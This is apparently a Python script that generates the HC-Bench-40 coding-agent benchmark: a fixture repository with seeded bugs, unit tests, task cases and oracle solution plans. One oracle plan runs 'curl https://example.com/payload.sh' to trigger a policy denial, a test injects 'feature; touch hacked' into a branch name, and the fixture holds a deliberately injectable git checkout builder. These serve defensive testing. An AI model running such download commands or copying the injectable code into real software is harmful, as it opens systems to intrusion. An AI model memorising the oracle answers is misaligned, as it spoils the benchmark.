from __future__ import annotations

import json
import shutil
from pathlib import Path
from typing import Any

from generate_hc_bench_20 import (
    FIXTURE as BENCH20_FIXTURE,
    build_cases_and_plans as build_bench20_cases_and_plans,
    edit,
    read,
    run_command,
    run_tests,
    search,
    trace_verifier,
    write,
    write_fixture as write_bench20_fixture,
    write_json,
)


ROOT = Path(__file__).resolve().parents[1]
FIXTURE = ROOT / "examples" / "hc_bench_40" / "repo"
EVAL_PATH = ROOT / "eval" / "hc_bench_40.json"
ORACLE_PATH = ROOT / "harnesscoder" / "data" / "hc_bench_40_oracle.json"


def main() -> None:
    write_fixture()
    cases, plans = build_cases_and_plans()
    write_json(EVAL_PATH, {"suite": "HC-Bench-40", "version": "1.2.1", "cases": cases})
    write_json(ORACLE_PATH, {"suite": "HC-Bench-40", "version": "1.2.1", "plans": plans})


def write_fixture() -> None:
    write_bench20_fixture()
    if FIXTURE.exists():
        shutil.rmtree(FIXTURE)
    shutil.copytree(
        BENCH20_FIXTURE,
        FIXTURE,
        ignore=shutil.ignore_patterns("__pycache__", "*.pyc"),
    )
    (FIXTURE / "algorithms.py").write_text(ALGORITHMS, encoding="utf-8")
    (FIXTURE / "workflow.py").write_text(WORKFLOW, encoding="utf-8")
    (FIXTURE / "parsers.py").write_text(PARSERS, encoding="utf-8")
    (FIXTURE / "security_extra.py").write_text(SECURITY_EXTRA, encoding="utf-8")
    (FIXTURE / "routing_rules.py").write_text(
        large_module("routing", ROUTING_RULES, 180),
        encoding="utf-8",
    )
    (FIXTURE / "ownership_rules.py").write_text(
        large_module("owner", OWNERSHIP_RULES, 175),
        encoding="utf-8",
    )
    (FIXTURE / "test_programming.py").write_text(TEST_PROGRAMMING, encoding="utf-8")
    (FIXTURE / "test_recovery_extra.py").write_text(TEST_RECOVERY_EXTRA, encoding="utf-8")
    (FIXTURE / "test_large_context_extra.py").write_text(TEST_LARGE_CONTEXT_EXTRA, encoding="utf-8")
    (FIXTURE / "test_security_extra.py").write_text(TEST_SECURITY_EXTRA, encoding="utf-8")


def build_cases_and_plans() -> tuple[list[dict[str, Any]], dict[str, list[dict[str, Any]]]]:
    bench20_cases, bench20_plans = build_bench20_cases_and_plans()
    cases: list[dict[str, Any]] = []
    plans: dict[str, list[dict[str, Any]]] = {}

    for case in bench20_cases:
        copied = dict(case)
        copied["repo_fixture"] = "examples/hc_bench_40/repo"
        cases.append(copied)
    plans.update(bench20_plans)

    edit_tools = ["read_file", "search_code", "edit_file", "run_tests"]
    write_tools = ["read_file", "search_code", "write_file", "run_tests"]

    def add_case(
        *,
        case_id: str,
        category: str,
        task: str,
        test_command: str,
        verifier: str,
        allowed_tools: list[str],
        step_budget: int,
        plan: list[dict[str, Any]],
    ) -> None:
        cases.append(
            {
                "id": case_id,
                "category": category,
                "task": f"[HC-Bench case: {case_id}] {task}",
                "cwd": ".",
                "repo_fixture": "examples/hc_bench_40/repo",
                "allowed_tools": allowed_tools,
                "step_budget": step_budget,
                "test_command": test_command,
                "timeout": 10,
                "success_returncode": 0,
                "verifier": verifier,
                "split": "heldout",
                "source": "synthetic-microbenchmark",
            }
        )
        plans[case_id] = plan

    add_case(
        case_id="program-merge-touching-intervals",
        category="bugfix",
        task="Fix interval merging so touching intervals are merged into one span.",
        test_command="python -m unittest test_programming.ProgrammingBugTests.test_merge_touching_intervals",
        verifier=trace_verifier("algorithms.py", min_tools={"search_code": 1, "read_file": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def merge_intervals", "."),
            read("algorithms.py"),
            edit("algorithms.py", "        if not merged or start >= merged[-1][1]:\n", "        if not merged or start > merged[-1][1]:\n"),
            run_tests("python -m unittest test_programming.ProgrammingBugTests.test_merge_touching_intervals"),
        ],
    )
    add_case(
        case_id="program-toposort-dependency-only-node",
        category="bugfix",
        task="Fix topological ordering so nodes that appear only as dependencies are included.",
        test_command="python -m unittest test_programming.ProgrammingBugTests.test_toposort_includes_dependency_only_nodes",
        verifier=trace_verifier("algorithms.py", min_tools={"search_code": 1, "read_file": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def topological_order", "."),
            read("algorithms.py"),
            edit(
                "algorithms.py",
                "    nodes = set(edges)\n    indegree = {node: 0 for node in nodes}\n    children = {node: [] for node in nodes}\n    for node, deps in edges.items():\n        for dep in deps:\n            indegree[node] += 1\n            children.setdefault(dep, []).append(node)\n",
                "    nodes = set(edges)\n    for deps in edges.values():\n        nodes.update(deps)\n    indegree = {node: 0 for node in nodes}\n    children = {node: [] for node in nodes}\n    for node, deps in edges.items():\n        for dep in deps:\n            indegree[node] += 1\n            children.setdefault(dep, []).append(node)\n",
            ),
            run_tests("python -m unittest test_programming.ProgrammingBugTests.test_toposort_includes_dependency_only_nodes"),
        ],
    )
    add_case(
        case_id="program-json-pointer-escape",
        category="bugfix",
        task="Fix JSON pointer lookup so RFC-style ~0 and ~1 escapes are handled.",
        test_command="python -m unittest test_programming.ProgrammingBugTests.test_json_pointer_unescapes_tokens",
        verifier=trace_verifier("algorithms.py", min_tools={"search_code": 1, "read_file": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def json_pointer_get", "."),
            read("algorithms.py"),
            edit(
                "algorithms.py",
                "    parts = pointer.strip(\"/\").split(\"/\")\n    current = document\n    for part in parts:\n        current = current[part]\n    return current\n",
                "    if pointer == \"\":\n        return document\n    parts = pointer.lstrip(\"/\").split(\"/\")\n    current = document\n    for part in parts:\n        token = part.replace(\"~1\", \"/\").replace(\"~0\", \"~\")\n        current = current[token]\n    return current\n",
            ),
            run_tests("python -m unittest test_programming.ProgrammingBugTests.test_json_pointer_unescapes_tokens"),
        ],
    )
    add_case(
        case_id="workflow-priority-order",
        category="bugfix",
        task="Fix task ordering so higher priority tasks run first while keeping stable order inside a priority.",
        test_command="python -m unittest test_programming.ProgrammingBugTests.test_priority_order_descending_stable",
        verifier=trace_verifier("workflow.py", min_tools={"search_code": 1, "read_file": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def order_tasks", "."),
            read("workflow.py"),
            edit("workflow.py", "    return sorted(tasks, key=lambda task: task.get(\"priority\", 0))\n", "    return sorted(tasks, key=lambda task: task.get(\"priority\", 0), reverse=True)\n"),
            run_tests("python -m unittest test_programming.ProgrammingBugTests.test_priority_order_descending_stable"),
        ],
    )

    add_case(
        case_id="recovery-semver-prerelease",
        category="recovery",
        task="Fix semantic version parsing for v-prefixed prerelease versions; recover after stripping only the prefix fails.",
        test_command="python -m unittest test_recovery_extra.RecoveryExtraTests.test_semver_ignores_prefix_and_prerelease",
        verifier=trace_verifier("parsers.py", min_tools={"search_code": 1, "edit_file": 2, "run_tests": 2}, require_failed_tests=True),
        allowed_tools=edit_tools,
        step_budget=8,
        plan=[
            search("def parse_semver", "."),
            read("parsers.py"),
            edit("parsers.py", "    major, minor, patch = value.split(\".\")\n", "    major, minor, patch = value.lstrip(\"v\").split(\".\")\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_semver_ignores_prefix_and_prerelease"),
            edit("parsers.py", "    major, minor, patch = value.lstrip(\"v\").split(\".\")\n", "    text = value.strip().lstrip(\"v\").split(\"-\", 1)[0]\n    major, minor, patch = text.split(\".\")\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_semver_ignores_prefix_and_prerelease"),
        ],
    )
    add_case(
        case_id="recovery-key-value-equals",
        category="recovery",
        task="Fix key-value line parsing and recover after a patch that still splits values containing equals signs.",
        test_command="python -m unittest test_recovery_extra.RecoveryExtraTests.test_key_value_lines_keep_equals_in_value",
        verifier=trace_verifier("parsers.py", min_tools={"search_code": 1, "edit_file": 2, "run_tests": 2}, require_failed_tests=True),
        allowed_tools=edit_tools,
        step_budget=8,
        plan=[
            search("def parse_key_value_lines", "."),
            read("parsers.py"),
            edit("parsers.py", "        key, value = raw.split(\"=\")\n", "        key, value = raw.strip().split(\"=\")\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_key_value_lines_keep_equals_in_value"),
            edit("parsers.py", "        key, value = raw.strip().split(\"=\")\n", "        if not raw.strip() or raw.lstrip().startswith(\"#\"):\n            continue\n        key, value = raw.strip().split(\"=\", 1)\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_key_value_lines_keep_equals_in_value"),
        ],
    )
    add_case(
        case_id="recovery-range-parser-open-ended",
        category="recovery",
        task="Fix integer range parsing and recover after handling whitespace but not open-ended ranges.",
        test_command="python -m unittest test_recovery_extra.RecoveryExtraTests.test_range_parser_open_ended",
        verifier=trace_verifier("parsers.py", min_tools={"search_code": 1, "edit_file": 2, "run_tests": 2}, require_failed_tests=True),
        allowed_tools=edit_tools,
        step_budget=8,
        plan=[
            search("def parse_ranges", "."),
            read("parsers.py"),
            edit("parsers.py", "        start, end = chunk.split(\"-\")\n", "        start, end = chunk.strip().split(\"-\")\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_range_parser_open_ended"),
            edit("parsers.py", "        ranges.append((int(start), int(end)))\n", "        ranges.append((int(start), None if end.strip() == \"\" else int(end)))\n"),
            run_tests("python -m unittest test_recovery_extra.RecoveryExtraTests.test_range_parser_open_ended"),
        ],
    )

    add_greenfield_cases(add_case, write_tools)

    add_context_cases(add_case, edit_tools)

    add_case(
        case_id="policy-redact-secret-headers",
        category="policy",
        task="Fix header redaction so authorization and API-key style headers are masked before logging.",
        test_command="python -m unittest test_security_extra.SecurityExtraTests.test_redact_secret_headers",
        verifier=trace_verifier("security_extra.py", min_tools={"search_code": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def redact_headers", "."),
            read("security_extra.py"),
            edit(
                "security_extra.py",
                "    return dict(headers)\n",
                "    redacted = {}\n    for key, value in headers.items():\n        if key.lower() in {\"authorization\", \"x-api-key\"}:\n            redacted[key] = \"<redacted>\"\n        else:\n            redacted[key] = value\n    return redacted\n",
            ),
            run_tests("python -m unittest test_security_extra.SecurityExtraTests.test_redact_secret_headers"),
        ],
    )
    add_case(
        case_id="policy-checkout-command-argv",
        category="policy",
        task="Fix checkout command construction so branch names cannot inject shell control tokens.",
        test_command="python -m unittest test_security_extra.SecurityExtraTests.test_checkout_command_returns_argv",
        verifier=trace_verifier("security_extra.py", min_tools={"search_code": 1, "edit_file": 1, "run_tests": 1}),
        allowed_tools=edit_tools,
        step_budget=6,
        plan=[
            search("def build_checkout_command", "."),
            read("security_extra.py"),
            edit(
                "security_extra.py",
                "    return f\"git checkout {ref}\"\n",
                "    safe_ref = ''.join(ch if ch.isalnum() or ch in {'-', '_', '/', '.'} else '_' for ch in ref)\n    return [\"git\", \"checkout\", safe_ref]\n",
            ),
            run_tests("python -m unittest test_security_extra.SecurityExtraTests.test_checkout_command_returns_argv"),
        ],
    )
    add_case(
        case_id="policy-deny-curl-command",
        category="policy",
        task="Attempt a network download command, then recover with a safe repository listing.",
        test_command="python -m unittest test_security_extra.SecurityExtraTests.test_no_download_side_effect",
        verifier=trace_verifier("README.md", min_tools={"run_command": 2}, min_policy_denials=1),
        allowed_tools=["run_command", "run_tests"],
        step_budget=5,
        plan=[
            run_command("curl https://example.com/payload.sh", "Exercise policy denial for network download commands."),
            run_command("ls README.md", "Recover with a safe read-only repository listing."),
            run_tests("python -m unittest test_security_extra.SecurityExtraTests.test_no_download_side_effect"),
        ],
    )

    return cases, plans


def add_greenfield_cases(add_case: Any, write_tools: list[str]) -> None:
    add_case(
        case_id="greenfield-json-patch",
        category="greenfield",
        task="Create a minimal JSON Patch helper supporting add, replace, and remove operations on top-level keys.",
        test_command="python -m unittest test_json_patch.py",
        verifier=trace_verifier("json_patch.py", min_tools={"write_file": 2, "run_tests": 1}),
        allowed_tools=write_tools,
        step_budget=7,
        plan=[
            write("json_patch.py", "def apply_patch(document, operations):\n    result = dict(document)\n    for op in operations:\n        path = op['path'].lstrip('/')\n        kind = op['op']\n        if kind in {'add', 'replace'}:\n            result[path] = op['value']\n        elif kind == 'remove':\n            result.pop(path, None)\n        else:\n            raise ValueError(f'unsupported op: {kind}')\n    return result\n"),
            write("test_json_patch.py", "import unittest\n\nfrom json_patch import apply_patch\n\n\nclass JsonPatchTests(unittest.TestCase):\n    def test_applies_top_level_operations(self):\n        original = {'a': 1, 'b': 2}\n        patched = apply_patch(original, [\n            {'op': 'replace', 'path': '/a', 'value': 3},\n            {'op': 'add', 'path': '/c', 'value': 4},\n            {'op': 'remove', 'path': '/b'},\n        ])\n        self.assertEqual(patched, {'a': 3, 'c': 4})\n        self.assertEqual(original, {'a': 1, 'b': 2})\n\n\nif __name__ == '__main__':\n    unittest.main()\n"),
            run_tests("python -m unittest test_json_patch.py"),
        ],
    )
    add_case(
        case_id="greenfield-dependency-layers",
        category="greenfield",
        task="Create a helper that groups dependency graph nodes into executable layers.",
        test_command="python -m unittest test_dependency_layers.py",
        verifier=trace_verifier("dependency_layers.py", min_tools={"write_file": 2, "run_tests": 1}),
        allowed_tools=write_tools,
        step_budget=7,
        plan=[
            write("dependency_layers.py", "def dependency_layers(dependencies):\n    nodes = set(dependencies)\n    for deps in dependencies.values():\n        nodes.update(deps)\n    remaining = {node: set(dependencies.get(node, [])) for node in nodes}\n    layers = []\n    while remaining:\n        ready = sorted(node for node, deps in remaining.items() if not deps)\n        if not ready:\n            raise ValueError('cycle detected')\n        layers.append(ready)\n        for node in ready:\n            remaining.pop(node)\n        for deps in remaining.values():\n            deps.difference_update(ready)\n    return layers\n"),
            write("test_dependency_layers.py", "import unittest\n\nfrom dependency_layers import dependency_layers\n\n\nclass DependencyLayersTests(unittest.TestCase):\n    def test_groups_ready_nodes(self):\n        deps = {'deploy': ['package'], 'package': ['test'], 'lint': [], 'test': []}\n        self.assertEqual(dependency_layers(deps), [['lint', 'test'], ['package'], ['deploy']])\n\n\nif __name__ == '__main__':\n    unittest.main()\n"),
            run_tests("python -m unittest test_dependency_layers.py"),
        ],
    )
    add_case(
        case_id="greenfield-prefix-index",
        category="greenfield",
        task="Create a prefix index that returns sorted words matching a prefix.",
        test_command="python -m unittest test_prefix_index.py",
        verifier=trace_verifier("prefix_index.py", min_tools={"write_file": 2, "run_tests": 1}),
        allowed_tools=write_tools,
        step_budget=7,
        plan=[
            write("prefix_index.py", "class PrefixIndex:\n    def __init__(self, words):\n        self.words = sorted(set(words))\n\n    def search(self, prefix):\n        return [word for word in self.words if word.startswith(prefix)]\n"),
            write("test_prefix_index.py", "import unittest\n\nfrom prefix_index import PrefixIndex\n\n\nclass PrefixIndexTests(unittest.TestCase):\n    def test_searches_sorted_unique_words(self):\n        index = PrefixIndex(['agent', 'agenda', 'bench', 'agent'])\n        self.assertEqual(index.search('age'), ['agenda', 'agent'])\n        self.assertEqual(index.search('x'), [])\n\n\nif __name__ == '__main__':\n    unittest.main()\n"),
            run_tests("python -m unittest test_prefix_index.py"),
        ],
    )
    add_case(
        case_id="greenfield-batch-windows",
        category="greenfield",
        task="Create a helper that chunks items into fixed-size batches.",
        test_command="python -m unittest test_batch_windows.py",
        verifier=trace_verifier("batch_windows.py", min_tools={"write_file": 2, "run_tests": 1}),
        allowed_tools=write_tools,
        step_budget=7,
        plan=[
            write("batch_windows.py", "def batches(items, size):\n    if size <= 0:\n        raise ValueError('size must be positive')\n    return [list(items[index:index + size]) for index in range(0, len(items), size)]\n"),
            write("test_batch_windows.py", "import unittest\n\nfrom batch_windows import batches\n\n\nclass BatchWindowsTests(unittest.TestCase):\n    def test_batches_items(self):\n        self.assertEqual(batches([1, 2, 3, 4, 5], 2), [[1, 2], [3, 4], [5]])\n        with self.assertRaises(ValueError):\n            batches([1], 0)\n\n\nif __name__ == '__main__':\n    unittest.main()\n"),
            run_tests("python -m unittest test_batch_windows.py"),
        ],
    )
    add_case(
        case_id="greenfield-circuit-breaker",
        category="greenfield",
        task="Create a small circuit breaker that opens after a failure threshold and can be reset.",
        test_command="python -m unittest test_circuit_breaker.py",
        verifier=trace_verifier("circuit_breaker.py", min_tools={"write_file": 2, "run_tests": 1}),
        allowed_tools=write_tools,
        step_budget=7,
        plan=[
            write("circuit_breaker.py", "class CircuitBreaker:\n    def __init__(self, threshold):\n        self.threshold = threshold\n        self.failures = 0\n        self.open = False\n\n    def record_success(self):\n        self.failures = 0\n        self.open = False\n\n    def record_failure(self):\n        self.failures += 1\n        if self.failures >= self.threshold:\n            self.open = True\n\n    def allow(self):\n        return not self.open\n"),
            write("test_circuit_breaker.py", "import unittest\n\nfrom circuit_breaker import CircuitBreaker\n\n\nclass CircuitBreakerTests(unittest.TestCase):\n    def test_opens_and_resets(self):\n        breaker = CircuitBreaker(2)\n        self.assertTrue(breaker.allow())\n        breaker.record_failure()\n        self.assertTrue(breaker.allow())\n        breaker.record_failure()\n        self.assertFalse(breaker.allow())\n        breaker.record_success()\n        self.assertTrue(breaker.allow())\n\n\nif __name__ == '__main__':\n    unittest.main()\n"),
            run_tests("python -m unittest test_circuit_breaker.py"),
        ],
    )


def add_context_cases(add_case: Any, edit_tools: list[str]) -> None:
    context_specs = [
        (
            "context-routing-parallel-large-file",
            "routing_rules.py",
            "provider_max_parallel",
            540,
            "Fix provider parallelism lookup so unknown providers default to one worker.",
            "python -m unittest test_large_context_extra.LargeContextExtraTests.test_provider_parallel_default",
            "    return limits[name]\n",
            "    return limits.get(name, 1)\n",
        ),
        (
            "context-routing-region-large-file",
            "routing_rules.py",
            "region_endpoint",
            605,
            "Fix region endpoint lookup so unknown regions use the global endpoint.",
            "python -m unittest test_large_context_extra.LargeContextExtraTests.test_region_endpoint_default",
            "    return endpoints[region]\n",
            "    return endpoints.get(region, \"global\")\n",
        ),
        (
            "context-routing-quota-large-file",
            "routing_rules.py",
            "burst_quota",
            670,
            "Fix burst quota lookup so unknown plans use a conservative default.",
            "python -m unittest test_large_context_extra.LargeContextExtraTests.test_burst_quota_default",
            "    return quotas[plan]\n",
            "    return quotas.get(plan, 10)\n",
        ),
        (
            "context-owner-team-large-file",
            "ownership_rules.py",
            "team_for_path",
            525,
            "Fix owner lookup so unknown paths fall back to the platform team.",
            "python -m unittest test_large_context_extra.LargeContextExtraTests.test_team_for_path_default",
            "    return owners[path]\n",
            "    return owners.get(path, \"platform\")\n",
        ),
        (
            "context-owner-review-large-file",
            "ownership_rules.py",
            "review_sla_hours",
            590,
            "Fix review SLA lookup so unknown teams use a 24-hour default.",
            "python -m unittest test_large_context_extra.LargeContextExtraTests.test_review_sla_default",
            "    return slas[team]\n",
            "    return slas.get(team, 24)\n",
        ),
    ]
    for case_id, path, symbol, offset, task, test_command, old, new in context_specs:
        add_case(
            case_id=case_id,
            category="context",
            task=task,
            test_command=test_command,
            verifier=trace_verifier(path, min_tools={"search_code": 1, "read_file": 1, "edit_file": 1, "run_tests": 1}, max_read_limit=80),
            allowed_tools=edit_tools,
            step_budget=6,
            plan=[
                search(symbol, "."),
                read(path, offset, 60),
                edit(path, old, new),
                run_tests(test_command),
            ],
        )


def large_module(prefix: str, target_functions: str, filler_count: int) -> str:
    lines = ["from __future__ import annotations", ""]
    for index in range(filler_count):
        lines.append(f"def {prefix}_filler_{index}(value):")
        lines.append(f"    return value + {index}")
        lines.append("")
    lines.append(target_functions.rstrip())
    lines.append("")
    return "\n".join(lines)


ALGORITHMS = """from __future__ import annotations


def merge_intervals(intervals):
    merged = []
    for start, end in sorted(intervals):
        if not merged or start >= merged[-1][1]:
            merged.append([start, end])
        else:
            merged[-1][1] = max(merged[-1][1], end)
    return [tuple(item) for item in merged]


def topological_order(edges):
    nodes = set(edges)
    indegree = {node: 0 for node in nodes}
    children = {node: [] for node in nodes}
    for node, deps in edges.items():
        for dep in deps:
            indegree[node] += 1
            children.setdefault(dep, []).append(node)

    ready = sorted(node for node, degree in indegree.items() if degree == 0)
    order = []
    while ready:
        node = ready.pop(0)
        order.append(node)
        for child in children.get(node, []):
            indegree[child] -= 1
            if indegree[child] == 0:
                ready.append(child)
                ready.sort()
    return order


def json_pointer_get(document, pointer):
    parts = pointer.strip("/").split("/")
    current = document
    for part in parts:
        current = current[part]
    return current
"""


WORKFLOW = """from __future__ import annotations


def order_tasks(tasks):
    return sorted(tasks, key=lambda task: task.get("priority", 0))
"""


PARSERS = """from __future__ import annotations


def parse_semver(value):
    major, minor, patch = value.split(".")
    return int(major), int(minor), int(patch)


def parse_key_value_lines(text):
    result = {}
    for raw in text.splitlines():
        key, value = raw.split("=")
        result[key.strip()] = value.strip()
    return result


def parse_ranges(text):
    ranges = []
    for chunk in text.split(","):
        start, end = chunk.split("-")
        ranges.append((int(start), int(end)))
    return ranges
"""


SECURITY_EXTRA = """from __future__ import annotations


def redact_headers(headers):
    return dict(headers)


def build_checkout_command(ref):
    return f"git checkout {ref}"
"""


ROUTING_RULES = """def provider_max_parallel(name):
    limits = {
        "openai": 8,
        "local-model": 2,
    }
    return limits[name]


def region_endpoint(region):
    endpoints = {
        "us": "us",
        "eu": "eu",
    }
    return endpoints[region]


def burst_quota(plan):
    quotas = {
        "free": 5,
        "pro": 100,
    }
    return quotas[plan]
"""


OWNERSHIP_RULES = """def team_for_path(path):
    owners = {
        "harnesscoder/core/runner.py": "runtime",
        "harnesscoder/core/policy.py": "security",
    }
    return owners[path]


def review_sla_hours(team):
    slas = {
        "runtime": 12,
        "security": 4,
    }
    return slas[team]
"""


TEST_PROGRAMMING = """import unittest

from algorithms import json_pointer_get, merge_intervals, topological_order
from workflow import order_tasks


class ProgrammingBugTests(unittest.TestCase):
    def test_merge_touching_intervals(self):
        self.assertEqual(merge_intervals([(1, 3), (3, 5), (8, 9)]), [(1, 5), (8, 9)])

    def test_toposort_includes_dependency_only_nodes(self):
        order = topological_order({"package": ["build"], "build": ["test"]})
        self.assertEqual(order, ["test", "build", "package"])

    def test_json_pointer_unescapes_tokens(self):
        doc = {"a/b": {"tilde~key": 7}}
        self.assertEqual(json_pointer_get(doc, "/a~1b/tilde~0key"), 7)
        self.assertIs(json_pointer_get(doc, ""), doc)

    def test_priority_order_descending_stable(self):
        tasks = [
            {"id": "low", "priority": 1},
            {"id": "first-high", "priority": 10},
            {"id": "second-high", "priority": 10},
        ]
        self.assertEqual(
            [task["id"] for task in order_tasks(tasks)],
            ["first-high", "second-high", "low"],
        )


if __name__ == "__main__":
    unittest.main()
"""


TEST_RECOVERY_EXTRA = """import unittest

from parsers import parse_key_value_lines, parse_ranges, parse_semver


class RecoveryExtraTests(unittest.TestCase):
    def test_semver_ignores_prefix_and_prerelease(self):
        self.assertEqual(parse_semver("v1.2.3-alpha.1"), (1, 2, 3))
        self.assertEqual(parse_semver("2.0.1"), (2, 0, 1))

    def test_key_value_lines_keep_equals_in_value(self):
        text = "# comment\\ntoken=a=b=c\\n mode = safe \\n\\n"
        self.assertEqual(parse_key_value_lines(text), {"token": "a=b=c", "mode": "safe"})

    def test_range_parser_open_ended(self):
        self.assertEqual(parse_ranges("1-3, 5-"), [(1, 3), (5, None)])


if __name__ == "__main__":
    unittest.main()
"""


TEST_LARGE_CONTEXT_EXTRA = """import unittest

from ownership_rules import review_sla_hours, team_for_path
from routing_rules import burst_quota, provider_max_parallel, region_endpoint


class LargeContextExtraTests(unittest.TestCase):
    def test_provider_parallel_default(self):
        self.assertEqual(provider_max_parallel("unknown"), 1)
        self.assertEqual(provider_max_parallel("openai"), 8)

    def test_region_endpoint_default(self):
        self.assertEqual(region_endpoint("apac"), "global")
        self.assertEqual(region_endpoint("eu"), "eu")

    def test_burst_quota_default(self):
        self.assertEqual(burst_quota("enterprise"), 10)
        self.assertEqual(burst_quota("pro"), 100)

    def test_team_for_path_default(self):
        self.assertEqual(team_for_path("README.md"), "platform")
        self.assertEqual(team_for_path("harnesscoder/core/policy.py"), "security")

    def test_review_sla_default(self):
        self.assertEqual(review_sla_hours("docs"), 24)
        self.assertEqual(review_sla_hours("security"), 4)


if __name__ == "__main__":
    unittest.main()
"""


TEST_SECURITY_EXTRA = """import unittest
from pathlib import Path

from security_extra import build_checkout_command, redact_headers


class SecurityExtraTests(unittest.TestCase):
    def test_redact_secret_headers(self):
        redacted = redact_headers({
            "Authorization": "Bearer secret",
            "x-api-key": "secret-key",
            "Content-Type": "application/json",
        })
        self.assertEqual(redacted["Authorization"], "<redacted>")
        self.assertEqual(redacted["x-api-key"], "<redacted>")
        self.assertEqual(redacted["Content-Type"], "application/json")

    def test_checkout_command_returns_argv(self):
        command = build_checkout_command("feature; touch hacked")
        self.assertIsInstance(command, list)
        self.assertEqual(command[:2], ["git", "checkout"])
        self.assertNotIn(";", command[2])

    def test_no_download_side_effect(self):
        self.assertFalse(Path("payload.sh").exists())


if __name__ == "__main__":
    unittest.main()
"""


if __name__ == "__main__":
    main()
